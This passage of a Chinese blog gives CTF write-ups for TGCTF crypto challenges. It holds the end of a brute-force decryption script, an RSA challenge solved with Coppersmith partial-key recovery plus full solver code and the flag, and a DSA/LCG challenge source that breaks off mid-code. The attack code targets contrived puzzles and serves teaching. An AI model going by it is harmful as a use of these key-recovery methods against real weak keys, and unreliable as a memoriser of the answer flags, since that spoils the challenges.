class="built_in">int</span>, <span class="built_in">reversed</span>(tail_str)))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> carry_feasible(digits, lx, ly):</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 若 7 块全部完成 -&gt; 选 x0</span></span><br><span class="line">        <span class="keyword">if</span> t_blocks == <span class="number">7</span>:</span><br><span class="line">            dream_tail = tail_str  <span class="comment"># (x1*y0)...(x7*y6)</span></span><br><span class="line">            <span class="comment"># dream 总长 = 1 + len(dream_tail)</span></span><br><span class="line">            total_len = <span class="number">1</span> + <span class="built_in">len</span>(dream_tail)</span><br><span class="line">            <span class="keyword">if</span> total_len != target_total_len:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="comment"># 还需要检查：k=7 模式下所有块是两位；k=6 模式下恰好 single_pos 那块是一位且其它两位；</span></span><br><span class="line">            <span class="keyword">if</span> all_two_digit:</span><br><span class="line">                <span class="comment"># quick assert</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">any</span>(<span class="built_in">len</span>(b) != <span class="number">2</span> <span class="keyword">for</span> b <span class="keyword">in</span> blocks_low_to_high):</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># single_pos 块必须是一位，其他必须是两位</span></span><br><span class="line">                <span class="keyword">for</span> idx, blk <span class="keyword">in</span> <span class="built_in">enumerate</span>(blocks_low_to_high):</span><br><span class="line">                    <span class="keyword">if</span> idx == single_pos:</span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">len</span>(blk) != <span class="number">1</span>:</span><br><span class="line">                            <span class="keyword">return</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">len</span>(blk) != <span class="number">2</span>:</span><br><span class="line">                            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># reconstruct x,y:</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(lx) != <span class="number">7</span> <span class="keyword">or</span> <span class="built_in">len</span>(ly) != <span class="number">7</span>:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            x_digits = [<span class="literal">None</span>]*<span class="number">8</span></span><br><span class="line">            y_digits = [<span class="literal">None</span>]*<span class="number">7</span></span><br><span class="line">            <span class="comment"># lx[0]=x7,... -&gt; x_digits[7-i] = lx[i]</span></span><br><span class="line">            <span class="keyword">for</span> i, dval <span class="keyword">in</span> <span class="built_in">enumerate</span>(lx):</span><br><span class="line">                x_digits[<span class="number">7</span> - i] = dval</span><br><span class="line">            <span class="keyword">for</span> i, dval <span class="keyword">in</span> <span class="built_in">enumerate</span>(ly):</span><br><span class="line">                y_digits[<span class="number">6</span> - i] = dval</span><br><span class="line"></span><br><span class="line">            blocks_from_high = <span class="built_in">list</span>(<span class="built_in">reversed</span>(blocks_low_to_high))</span><br><span class="line">            suffix = <span class="string">&quot;&quot;</span>.join(blocks_from_high)</span><br><span class="line">            <span class="comment"># 选 x0</span></span><br><span class="line">            <span class="keyword">for</span> x0 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">                x_digits[<span class="number">0</span>] = x0</span><br><span class="line">                x = <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, x_digits)))</span><br><span class="line">                y = <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, y_digits)))</span><br><span class="line">                dream_val = <span class="built_in">int</span>(<span class="built_in">str</span>(x0) + suffix)</span><br><span class="line">                prod = x * y</span><br><span class="line">                <span class="keyword">if</span> prod == dream_val <span class="keyword">and</span> prod != EXCLUDED:</span><br><span class="line">                    key = sha256(<span class="built_in">str</span>((x, y)).encode()).digest()</span><br><span class="line">                    pt = AES.new(key, AES.MODE_ECB).decrypt(<span class="built_in">bytes</span>.fromhex(CT))</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        dec = pt.decode()</span><br><span class="line">                    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">                        dec = <span class="built_in">repr</span>(pt)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[FOUND] mode=<span class="subst">&#123;mode_desc&#125;</span> x=<span class="subst">&#123;x&#125;</span> y=<span class="subst">&#123;y&#125;</span> prod=<span class="subst">&#123;prod&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;        dream=<span class="subst">&#123;dream_val&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;        Decrypted:&quot;</span>, dec)</span><br><span class="line">                    solutions.append((x, y, prod, dec))</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> continue_search:</span><br><span class="line">                        <span class="keyword">raise</span> StopIteration</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 选择下一块 (block_index)</span></span><br><span class="line">        k = block_index  <span class="comment"># 0..6, 低位=0</span></span><br><span class="line">        <span class="comment"># 根据模式决定候选集合</span></span><br><span class="line">        <span class="keyword">if</span> all_two_digit:</span><br><span class="line">            cand = two_digit_pairs</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cand = one_digit_pairs <span class="keyword">if</span> k == single_pos <span class="keyword">else</span> two_digit_pairs</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> a, b, pval, s <span class="keyword">in</span> cand:</span><br><span class="line">            <span class="comment"># 追加块</span></span><br><span class="line">            new_blocks = blocks_low_to_high + [s]</span><br><span class="line">            new_lx = lx + [a]</span><br><span class="line">            new_ly = ly + [b]</span><br><span class="line">            <span class="comment"># 长度快速界</span></span><br><span class="line">            new_tail_len = L_tail + <span class="built_in">len</span>(s)</span><br><span class="line">            new_r = <span class="number">7</span> - (t_blocks + <span class="number">1</span>)</span><br><span class="line">            min_total = <span class="number">1</span> + new_tail_len + new_r*<span class="number">1</span></span><br><span class="line">            max_total = <span class="number">1</span> + new_tail_len + new_r*<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> min_total &gt; target_total_len <span class="keyword">or</span> max_total &lt; target_total_len:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            dfs(block_index + <span class="number">1</span>, new_blocks, new_lx, new_ly)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> (a, b, pval, s) <span class="keyword">in</span> pbar:</span><br><span class="line">            dfs(<span class="number">1</span>, [s], [a], [b])</span><br><span class="line">            <span class="keyword">if</span> solutions <span class="keyword">and</span> <span class="keyword">not</span> continue_search:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> StopIteration:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        pbar.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">continue_search=<span class="literal">False</span>, show_progress=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="comment"># 1) k=7 全两位</span></span><br><span class="line">    search_mode(all_two_digit=<span class="literal">True</span>,</span><br><span class="line">                single_pos=<span class="literal">None</span>,</span><br><span class="line">                continue_search=continue_search,</span><br><span class="line">                show_progress=show_progress)</span><br><span class="line">    <span class="keyword">if</span> solutions <span class="keyword">and</span> <span class="keyword">not</span> continue_search:</span><br><span class="line">        <span class="keyword">return</span> solutions</span><br><span class="line">    <span class="comment"># 2) k=6：枚举哪块是一位</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">if</span> solutions <span class="keyword">and</span> <span class="keyword">not</span> continue_search:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        search_mode(all_two_digit=<span class="literal">False</span>,</span><br><span class="line">                    single_pos=pos,</span><br><span class="line">                    continue_search=continue_search,</span><br><span class="line">                    show_progress=show_progress)</span><br><span class="line">    <span class="keyword">return</span> solutions</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    res = solve(continue_search=<span class="literal">False</span>, show_progress=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> res:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No solution found in current search configuration.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Total solutions: <span class="subst">&#123;<span class="built_in">len</span>(res)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> x, y, prod, dec <span class="keyword">in</span> res:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;x=<span class="subst">&#123;x&#125;</span> y=<span class="subst">&#123;y&#125;</span> prod=<span class="subst">&#123;prod&#125;</span> plaintext=<span class="subst">&#123;dec&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>TGCTF</title>
    <url>/2025/04/13/TGCTF/</url>
    <content><![CDATA[<p>qwq</p>
<p>比赛过一半了才开始打，不过还好都做出来了(看来最近还是有进步的XD</p>
<p>前面的都是些板子题，wp就写最后两题了(好吧其实就是比较懒…</p>
<span id="more"></span>

<h1 id="EZREA"><a href="#EZREA" class="headerlink" title="EZREA"></a>EZREA</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag, get_random_emojiiiiii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genarate_emojiiiiii_prime</span>(<span class="params">nbits, base=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(base // <span class="number">32</span> * <span class="number">32</span>) <span class="keyword">if</span> base &gt;= <span class="number">3</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbits // <span class="number">8</span> // <span class="number">4</span> - base // <span class="number">32</span>):</span><br><span class="line">            p = (p &lt;&lt; <span class="number">32</span>) + get_random_emojiiiiii() <span class="comment"># 猜一猜</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line">m = bytes_to_long(flag.encode()+ <span class="string">&quot;&quot;</span>.join([long_to_bytes(get_random_emojiiiiii()).decode() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]).encode())</span><br><span class="line">p = genarate_emojiiiiii_prime(<span class="number">512</span>, <span class="number">224</span>)</span><br><span class="line">q = genarate_emojiiiiii_prime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="string">&quot;💯&quot;</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, bytes_to_long(e.encode()), n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p0 =&quot;</span>, long_to_bytes(p % <span class="number">2</span> ** <span class="number">256</span>).decode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"><span class="comment"># p0 = 😘😾😂😋😶😾😳😷</span></span><br><span class="line"><span class="comment"># n = 156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579</span></span><br><span class="line"><span class="comment"># c = 47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401</span></span><br></pre></td></tr></table></figure>

<p>将给出的p0转化为实际的p低位，此时泄露的低位是256bit，而p为512位，所以此时已知的位数是不足以支撑我们直接打copper的，分析源码不难看到，p后面应该是有9个emoji的，而我们已知的只有8个，对这八个emoji分析一下，发现它们前六位16进制是一样的，那么已知前六位后面的位数爆一下就行。这样就又知道32位，copper就很好打了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line">p0_emojis = <span class="string">&quot;😘😾😂😋😶😾😳😷&quot;</span></span><br><span class="line">n =<span class="number">156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579</span></span><br><span class="line">c =<span class="number">47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401</span></span><br><span class="line">e_str = <span class="string">&quot;💯&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将e转换为整数</span></span><br><span class="line">e_bytes = e_str.encode()</span><br><span class="line">e = bytes_to_long(e_bytes)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="comment">#e=4036989615</span></span><br><span class="line"><span class="comment"># 将p0的emojis转换为整数b</span></span><br><span class="line">plow = bytes_to_long(p0_emojis.encode())</span><br><span class="line"><span class="built_in">print</span>(plow)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_p</span>():</span><br><span class="line">    P.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">256</span>):</span><br><span class="line">        f = x * <span class="number">2</span>**(<span class="number">256</span>+<span class="number">32</span>) + (<span class="number">0xf09f9800</span>+i)*<span class="number">2</span>**<span class="number">256</span> + plow</span><br><span class="line">        f = f.monic()  <span class="comment"># 转换为monic多项式</span></span><br><span class="line">        roots = f.small_roots(X=<span class="number">2</span>^<span class="number">224</span>, beta=<span class="number">0.4</span>)</span><br><span class="line">        <span class="keyword">if</span> roots:</span><br><span class="line">            x0 = roots[<span class="number">0</span>]</span><br><span class="line">            p = <span class="built_in">int</span>(x0)* <span class="number">2</span>**(<span class="number">256</span>+<span class="number">32</span>) +(<span class="number">0xf09f9800</span>+i)*<span class="number">2</span>**<span class="number">256</span> + plow</span><br><span class="line">            <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">                q = n // p</span><br><span class="line">                <span class="keyword">return</span> p, q</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">p, q = solve_p()</span><br></pre></td></tr></table></figure>

<p>解出pq之后发现还存在e与phi不互素的问题，有限域开根即可，又因为flag尾部有填充使其大于n，所以最后解出的m要爆一下加上k倍n。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"><span class="comment"># 已知的值</span></span><br><span class="line">p0_emojis = <span class="string">&quot;😘😾😂😋😶😾😳😷&quot;</span></span><br><span class="line">n =<span class="number">156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579</span></span><br><span class="line">c =<span class="number">47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401</span></span><br><span class="line">e_str = <span class="string">&quot;💯&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将e转换为整数</span></span><br><span class="line">e_bytes = e_str.encode()</span><br><span class="line">e = bytes_to_long(e_bytes)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="comment">#e=4036989615</span></span><br><span class="line"><span class="comment"># 将p0的emojis转换为整数b</span></span><br><span class="line">plow = bytes_to_long(p0_emojis.encode())</span><br><span class="line"><span class="built_in">print</span>(plow)</span><br><span class="line"><span class="comment"># 使用SageMath的Coppersmith方法求解p的高位</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_p</span>():</span><br><span class="line">    <span class="comment"># 注意：以下代码应在SageMath环境中运行</span></span><br><span class="line">    P.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">256</span>):</span><br><span class="line">        f = x * <span class="number">2</span>**(<span class="number">256</span>+<span class="number">32</span>) + (<span class="number">0xf09f9800</span>+i)*<span class="number">2</span>**<span class="number">256</span> + plow</span><br><span class="line">        f = f.monic()  <span class="comment"># 转换为monic多项式</span></span><br><span class="line">        <span class="comment"># 寻找小根</span></span><br><span class="line">        roots = f.small_roots(X=<span class="number">2</span>^<span class="number">224</span>, beta=<span class="number">0.4</span>)</span><br><span class="line">        <span class="keyword">if</span> roots:</span><br><span class="line">            x0 = roots[<span class="number">0</span>]</span><br><span class="line">            p = <span class="built_in">int</span>(x0)* <span class="number">2</span>**(<span class="number">256</span>+<span class="number">32</span>) +(<span class="number">0xf09f9800</span>+i)*<span class="number">2</span>**<span class="number">256</span> + plow</span><br><span class="line">            <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">                q = n // p</span><br><span class="line">                <span class="keyword">return</span> p, q</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">p, q = solve_p()</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">g = gcd(e, phi)</span><br><span class="line">d = gmpy2.invert(e//g, phi)</span><br><span class="line">c = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">PR.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">f = x^g - c</span><br><span class="line">resq = f.roots()</span><br><span class="line">PR.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x^g - c</span><br><span class="line">resp = f.roots()</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> resp:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> resq:</span><br><span class="line">            ti = <span class="built_in">int</span>(i[<span class="number">0</span>])</span><br><span class="line">            tj = <span class="built_in">int</span>(j[<span class="number">0</span>])</span><br><span class="line">            nn = [p,q]</span><br><span class="line">            c = [ti,tj]</span><br><span class="line">            m = long_to_bytes(<span class="built_in">int</span>(crt(c,nn))+k*n)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;TGCTF&#123;&quot;</span> <span class="keyword">in</span> m:</span><br><span class="line">                <span class="built_in">print</span>(m.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">TGCTF&#123;🙇🏮🤟_🫡🫡🫡_🚩🚩🚩&#125;😃😖😘😨😢</span><br></pre></td></tr></table></figure>



<h1 id="LLLCG"><a href="#LLLCG" class="headerlink" title="LLLCG"></a>LLLCG</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, inverse, bytes_to_long, isPrime</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, dsa_p, dsa_q</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TripleLCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed1, seed2, seed3, a, b, c, d, n</span>):</span><br><span class="line">        self.state = [seed1, seed2, seed3]</span><br><span class="line">        self.a = a</span><br><span class="line">        self.b = b</span><br><span class="line">        self.c = c</span><br><span class="line">        self.d = d</span><br><span class="line">        self.n = n</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        new = (self.a * self.state[-<span class="number">3</span>] + self.b * self.state[-<span class="number">2</span>] + self.c * self.state[-<span class="number">1</span>] + self.d) % self.n</span><br><span class="line">        self.state.append(new)</span><br><span class="line">        <span class="keyword">return</span> new</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DSA</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># while True:</span></span><br><span class="line">            <span class="comment"># self.q = getPrime(160)</span></span><br><span class="line">            <span class="comment"># t = 2 * getPrime(1024 - 160) * self.q</span></span><br><span class="line">            <span class="comment"># if isPrime(t + 1):</span></span><br><span class="line">            <span class="comment">#    self.p = t + 1</span></span><br><span class="line">            <span class="comment">#    break</span></span><br><span class="line">        self.p = dsa_p</span><br><span class="line">        self.q = dsa_q</span><br><span class="line">        self.g = <span class="built_in">pow</span>(<span class="number">2</span>, (self.p - <span class="number">1</span>) // self.q, self.p)</span><br><span class="line">        self.x = randint(<span class="number">1</span>, self.q - <span class="number">1</span>)</span><br><span class="line">        self.y = <span class="built_in">pow</span>(self.g, self.x, self.p)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">self, msg, k</span>):</span><br><span class="line">        h = bytes_to_long(sha256(msg).digest())</span><br><span class="line">        r = <span class="built_in">pow</span>(self.g, k, self.p) % self.q</span><br><span class="line">        s = (inverse(k, self.q) * (h + self.x * r)) % self.q</span><br><span class="line">        <span class="keyword">return</span> (r, s)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, msg, r, s</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt; r &lt; self.q <span class="keyword">and</span> <span class="number">0</span> &lt; s &lt; self.q):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        h = bytes_to_long(sha256(msg).digest())</span><br><span class="line">        w = inverse(s, self.q)</span><br><span class="line">        u1 = (h * w) % self.q</span><br><span class="line">        u2 = (r * w) % self.q</span><br><span class="line">        v = ((<span class="built_in">pow</span>(self.g, u1, self.p) * <span class="built_in">pow</span>(self.y, u2, self.p)) % self.p) % self.q</span><br><span class="line">        <span class="keyword">return</span> v == r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_recvall</span>(<span class="params">self</span>):</span><br><span class="line">        BUFF_SIZE = <span class="number">2048</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            part = self.request.recv(BUFF_SIZE)</span><br><span class="line">            data += part</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(part) &lt; BUFF_SIZE:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span><br><span class="line">        <span class="keyword">if</span> newline:</span><br><span class="line">            msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">        self.request.sendall(msg)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recv</span>(<span class="params">self, prompt=<span class="string">b&#x27;[-] &#x27;</span></span>):</span><br><span class="line">        self.send(prompt, newline=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> self._recvall()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        n = getPrime(<span class="number">128</span>)</span><br><span class="line">        a, b, c, d = [randint(<span class="number">1</span>, n - <span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        seed1, seed2, seed3 = [randint(<span class="number">1</span>, n - <span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line">        lcg = TripleLCG(seed1, seed2, seed3, a, b, c, d, n)</span><br><span class="line">        dsa = DSA()</span><br><span class="line"></span><br><span class="line">        self.send(<span class="string">b&quot;Welcome to TGCTF Challenge!\n&quot;</span>)</span><br><span class="line">        self.send(<span class="string">f&quot;p = <span class="subst">&#123;dsa.p&#125;</span>, q = <span class="subst">&#123;dsa.q&#125;</span>, g = <span class="subst">&#123;dsa.g&#125;</span>, y = <span class="subst">&#123;dsa.y&#125;</span>&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line">        small_primes = [<span class="number">59093</span>, <span class="number">65371</span>, <span class="number">37337</span>, <span class="number">43759</span>, <span class="number">52859</span>, <span class="number">39541</span>, <span class="number">60457</span>, <span class="number">61469</span>, <span class="number">43711</span>]</span><br><span class="line">        used_messages = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">for</span> o_v <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            self.send(<span class="string">b&quot;Select challenge parts: 1, 2, 3\n&quot;</span>)</span><br><span class="line">            parts = self.recv().decode().split()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">in</span> parts:</span><br><span class="line">                self.send(<span class="string">b&quot;Part 1\n&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">                    self.send(<span class="string">f&quot;Message <span class="subst">&#123;i + <span class="number">1</span>&#125;</span>: &quot;</span>.encode())</span><br><span class="line">                    msg = self.recv()</span><br><span class="line">                    used_messages.add(msg)</span><br><span class="line">                    k = lcg.<span class="built_in">next</span>()</span><br><span class="line">                    r, s = dsa.sign(msg, k)</span><br><span class="line">                    self.send(<span class="string">f&quot;r = <span class="subst">&#123;r&#125;</span>, ks = <span class="subst">&#123;[k % p <span class="keyword">for</span> p <span class="keyword">in</span> small_primes]&#125;</span>\n&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;2&#x27;</span> <span class="keyword">in</span> parts:</span><br><span class="line">                self.send(<span class="string">b&quot;Part 2\n&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">307</span>):</span><br><span class="line">                    k = lcg.<span class="built_in">next</span>()</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">                    self.send(<span class="string">f&quot;Message <span class="subst">&#123;i + <span class="number">1</span>&#125;</span>: &quot;</span>.encode())</span><br><span class="line">                    msg = self.recv()</span><br><span class="line">                    k = lcg.<span class="built_in">next</span>() % dsa.q</span><br><span class="line">                    r, s = dsa.sign(msg, k)</span><br><span class="line">                    self.send(<span class="string">f&quot;Signature: r = <span class="subst">&#123;r&#125;</span>, s = <span class="subst">&#123;s&#125;</span>\n&quot;</span>.encode())</span><br><span class="line">                    used_messages.add(msg)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;3&#x27;</span> <span class="keyword">in</span> parts:</span><br><span class="line">                self.send(<span class="string">b&quot;Part 3\n&quot;</span>)</span><br><span class="line">                self.send(<span class="string">b&quot;Forged message: &quot;</span>)</span><br><span class="line">                final_msg = self.recv()</span><br><span class="line">                self.send(<span class="string">b&quot;Forged r: &quot;</span>)</span><br><span class="line">                r = <span class="built_in">int</span>(self.recv())</span><br><span class="line">                self.send(<span class="string">b&quot;Forged s: &quot;</span>)</span><br><span class="line">                s = <span class="built_in">int</span>(self.recv())</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> final_msg <span class="keyword">in</span> used_messages:</span><br><span class="line">                    self.send(<span class="string">b&quot;Message already signed!\n&quot;</span>)</span><br><span class="line">                <span class="keyword">elif</span> dsa.verify(final_msg, r, s):</span><br><span class="line">                    self.send(<span class="string">f&quot;Good! Your flag: <span 